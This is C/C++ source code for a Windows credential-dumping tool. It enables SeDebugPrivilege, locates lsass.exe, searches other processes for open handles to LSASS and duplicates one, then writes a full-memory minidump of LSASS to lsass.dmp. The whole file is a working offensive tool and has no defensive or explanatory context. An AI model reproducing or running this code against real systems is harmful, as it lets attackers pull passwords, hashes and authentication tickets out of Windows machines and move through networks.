#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <DbgHelp.h>

#pragma comment( lib, "ntdll" )
#pragma comment( lib, "Dbghelp" )
#define NT_SUCCESS(status) (status >= 0)

#define ProcessHandleInformation (PROCESSINFOCLASS)0x33
#define MAX_PROC_ARRLEN 512


// https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}


typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
	HANDLE HandleValue;
	ULONG_PTR HandleCount;
	ULONG_PTR PointerCount;
	ULONG GrantedAccess;
	ULONG ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, *PPROCESS_HANDLE_TABLE_ENTRY_INFO;

// private
typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, *PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

int main() {
	HANDLE hTok;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hTok);
	if (!SetPrivilege(hTok, "SeDebugPrivilege", TRUE)) {
		printf("Can't enable SeDebugPriv... Exiting\n");
		exit(5);
	}
	HANDLE outFile = CreateFile("lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	const char* _lsass = "lsass.exe";
	unsigned int _lsass_pid = 0;

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	PROCESSENTRY32* ppe = (PROCESSENTRY32*)malloc(sizeof(PROCESSENTRY32));
	
	DWORD* pid_list = (DWORD*)malloc(MAX_PROC_ARRLEN * sizeof(DWORD));
	ZeroMemory(pid_list, MAX_PROC_ARRLEN * sizeof(DWORD));

	int idx = 0;
	bool p32iter_res = Process32First(hSnap, ppe);
	do {
		pid_list[idx] = ppe->th32ProcessID;
		//printf("pid : %d\n", pid_list[idx]);
		if (strncmp(_lsass, ppe->szExeFile, strlen(_lsass)) == 0)
			_lsass_pid = pid_list[idx];
		++idx;
		p32iter_res = Process32Next(hSnap, ppe);
	} while (p32iter_res);
	// find all processes with handles to LSASS
	printf("LSASS PID: %d\n", _lsass_pid);
	puts("Done retrieving process list\n");
	puts("Starting handle hunt :^)\n");

	HANDLE hCur = GetCurrentProcess();
	DWORD self_pid = GetProcessId(hCur);
	// https://scorpiosoftware.net/2020/03/15/how-can-i-close-a-handle-in-another-process/
	for (int i = 0; i < idx; i++) {
		if (pid_list[i] == _lsass_pid || pid_list[i] == self_pid)
			continue;
		HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid_list[i]);
		if (hProc == NULL) {
			printf("NOHANDLE: %d -- Continuing\n", pid_list[i]);
			continue;
		}
		unsigned long ret_len = 0;
		// get the size of the struct needed
		PROCESS_HANDLE_SNAPSHOT_INFORMATION* pphsi = (PROCESS_HANDLE_SNAPSHOT_INFORMATION*)malloc(sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION));
		NtQueryInformationProcess(hProc, ProcessHandleInformation, pphsi, sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION), &ret_len);
		
		// allocate that phat buffer 
		unsigned char* buf = (unsigned char*)malloc(ret_len);
		NtQueryInformationProcess(hProc, ProcessHandleInformation, buf, ret_len, &ret_len);

		PROCESS_HANDLE_SNAPSHOT_INFORMATION* _pphsi = reinterpret_cast<PROCESS_HANDLE_SNAPSHOT_INFORMATION*> (buf);
		HANDLE lpTgtHandle = NULL;
		for (int j = 0; j < _pphsi->NumberOfHandles; j++) {
			HANDLE tgtVal = _pphsi->Handles[j].HandleValue;
			if (!DuplicateHandle(hProc, tgtVal, hCur, &lpTgtHandle, PROCESS_QUERY_INFORMATION, FALSE, DUPLICATE_SAME_ACCESS)) {
				continue;
			}
			int x = GetProcessId(lpTgtHandle);
			if (x == _lsass_pid) {
				printf("PROCESS %d HAS HANDLE FOR TARGET PID %d\n", pid_list[i], x);
				printf("ATTEMPTING DUMP...\n");
				if (MiniDumpWriteDump(lpTgtHandle, _lsass_pid, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
					printf("Dump written!\nExiting...\n");
					exit(1337);
				}
			}
		}
	}
	//getc(NULL);
}
